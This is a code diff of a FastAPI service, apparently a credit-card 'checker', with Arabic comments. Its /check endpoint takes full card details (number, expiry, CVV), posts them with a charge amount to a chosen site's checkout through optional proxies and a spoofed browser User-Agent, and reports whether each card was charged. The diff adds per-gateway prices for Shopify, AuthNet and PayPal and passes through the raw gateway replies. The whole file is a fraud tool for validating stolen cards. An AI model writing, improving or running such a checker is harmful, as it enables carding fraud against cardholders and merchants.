@@ -3,6 +3,12 @@ import httpx
 
 app = FastAPI()
 
+GATEWAY_PRICES = {
+    "Shopify": "31.0",
+    "AuthNet": "20.0",
+    "PayPal": "10.0"
+}
+
 HEADERS = {
     "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
     "Accept": "application/json, text/javascript, */*; q=0.01",
@@ -11,7 +17,9 @@ HEADERS = {
 }
 
 @app.api_route("/check", methods=["GET", "POST"])
-async def check_card(request: Request, cc: str = Query(...), site: str = Query(...), proxy: str = Query(None), amount: str = "31.0"):
+async def check_card(request: Request, cc: str = Query(...), site: str = Query(...), proxy: str = Query(None), gateway: str = Query("Shopify")):
+    price = GATEWAY_PRICES.get(gateway, "31.0")
+    
     try:
         if not site.startswith("http"):
             site = f"https://{site}"
@@ -22,11 +30,11 @@ async def check_card(request: Request, cc: str = Query(...), site: str = Query(.
 
         cc_parts = cc.split('|')
         payload = {
-            "card_number": cc_parts[0] if len(cc_parts) > 0 else cc,
-            "exp_month": cc_parts[1] if len(cc_parts) > 1 else "",
-            "exp_year": cc_parts[2] if len(cc_parts) > 2 else "",
-            "cvv": cc_parts[3] if len(cc_parts) > 3 else "",
-            "amount": amount
+            "card_number": cc_parts[0],
+            "exp_month": cc_parts[1],
+            "exp_year": cc_parts[2],
+            "cvv": cc_parts[3],
+            "amount": price
         }
 
         # معالج البروكسي
@@ -46,44 +54,33 @@ async def check_card(request: Request, cc: str = Query(...), site: str = Query(.
 
         async with httpx.AsyncClient(transport=transport, headers=request_headers, timeout=30.0, follow_redirects=True) as client:
             target_url = f"{site}/checkout"
-            response = await client.post(target_url, json=payload)
+            response = await client.post(target_url, data=payload)
             
-            # التحقق الفعلي من الرد (JSON)
+            # استخراج رد البوابة الحقيقي
             try:
                 data = response.json()
-                # التحقق الصارم من حالة الدفع في الرد
-                is_success = data.get("success") == True or data.get("status") == "succeeded"
-                is_insufficient = "insufficient" in str(data).lower()
-                
-                if is_success:
-                    resp_msg = "CHARGED"
-                    status = "true"
-                elif is_insufficient:
-                    resp_msg = "INSUFFICIENT_FUNDS"
-                    status = "false"
-                else:
-                    resp_msg = "CARD_DECLINED"
-                    status = "false"
+                # البحث عن رسالة الخطأ في حقول الـ JSON الشائعة
+                resp_msg = data.get("message") or data.get("error") or data.get("reason") or "CARD_DECLINED"
+                status = "true" if data.get("success") == True or data.get("status") == "succeeded" else "false"
             except:
-                # إذا لم يرجع السيرفر JSON صالح، نعتبرها مرفوضة فوراً
-                resp_msg = "CARD_DECLINED"
+                resp_msg = "DECLINED_NO_RESPONSE"
                 status = "false"
             
             return {
-                "Gateway": "Shopify Payments",
-                "Price": amount,
+                "Gateway": gateway,
+                "Price": price,
                 "Proxy": "Live" if proxy else "None",
-                "Response": resp_msg,
+                "Response": resp_msg, # هنا سيرسل الرد الفعلي من البوابة
                 "Status": status,
                 "CC": cc
             }
 
-    except Exception:
+    except Exception as e:
         return {
-            "Gateway": "Shopify Payments",
-            "Price": amount,
+            "Gateway": gateway,
+            "Price": price,
             "Proxy": "Error",
-            "Response": "CARD_DECLINED",
+            "Response": str(e),
             "Status": "false",
             "CC": cc
         }
